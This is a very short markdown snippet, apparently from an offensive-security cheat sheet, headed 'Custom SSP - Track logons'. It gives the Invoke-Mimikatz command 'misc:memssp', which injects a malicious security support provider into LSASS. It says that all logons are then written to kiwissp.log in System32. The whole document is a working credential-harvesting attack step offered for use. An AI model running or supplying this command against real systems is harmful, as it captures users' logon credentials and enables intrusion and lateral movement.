# Custom SSP - Track logons

### **Use Mimikatz to inject into LSASs**

all logons are logged to C:\Windows\System32\kiwissp.log

```
Invoke-Mimikatz -Command '"misc:memssp"'
```
